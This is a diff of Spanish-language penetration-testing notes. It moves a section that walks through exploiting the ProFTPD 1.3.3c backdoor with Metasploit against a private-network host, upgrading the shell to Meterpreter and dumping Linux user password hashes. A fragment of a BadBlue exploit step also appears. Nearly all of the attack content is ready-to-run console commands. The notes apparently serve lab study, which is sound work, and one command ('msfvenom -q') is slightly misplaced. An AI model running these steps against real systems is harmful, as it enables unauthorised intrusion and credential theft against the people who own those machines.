@@ -2,6 +2,29 @@
 
 Tags: #Metasploit #WebDav #BadBlue #SMB #BlueKeep #Samba #EternalBlue #FTP #HFS 
 
+## Puerto 21 FTP
+
+```bash 
+# Explotaremos la vulnerabilidad de Ftpd -> Proftpd versiones: (1.3.3c)
+❯ msfvenom -q                  # q = Quitar el banner de inicio
+
+	❯ use exploit/unix/ftp/proftpd_133c_backdoor          # Usamos el exploit                
+	❯ options
+	❯ set RHOSTS 192.168.68.1                     
+	❯ exploit
+
+❯ ctrl + z                   # Colocas la sesion en 'Background'
+❯ sessions                   # Miramos las sesiones activas 
+❯ sessions -u <ID>           # Regresamos a la sesion y lo hara con Meterpreter
+```
+
+Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo para el **'dumpeo de hashes'** de los usuarios existentes. 
+```bash 
+	❯ use post/linux/gather/hashdump          # Usamos el exploit                
+	❯ options
+	❯ set SESSION <ID>                        # Colocamos la sesion que ya tenemos activa en el 'Background'                      
+	❯ run 
+```
 ## HTTP 80
 
 ## BadBlue 2.7 Windows 
@@ -59,31 +82,6 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ set RHOSTS 192.168.68.1                     
 	❯ set TARGETURI /gettime.cgi
 	❯ exploit
-```
-
-
-## Puerto 21 FTP
-
-```bash 
-# Explotaremos la vulnerabilidad de Ftpd -> Proftpd versiones: (1.3.3c)
-❯ msfvenom -q                  # q = Quitar el banner de inicio
-
-	❯ use exploit/unix/ftp/proftpd_133c_backdoor          # Usamos el exploit                
-	❯ options
-	❯ set RHOSTS 192.168.68.1                     
-	❯ exploit
-
-❯ ctrl + z                   # Colocas la sesion en 'Background'
-❯ sessions                   # Miramos las sesiones activas 
-❯ sessions -u <ID>           # Regresamos a la sesion y lo hara con Meterpreter
-```
-
-Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo para el **'dumpeo de hashes'** de los usuarios existentes. 
-```bash 
-	❯ use post/linux/gather/hashdump          # Usamos el exploit                
-	❯ options
-	❯ set SESSION <ID>                        # Colocamos la sesion que ya tenemos activa en el 'Background'                      
-	❯ run 
 ```
 
 ## Puerto 445 
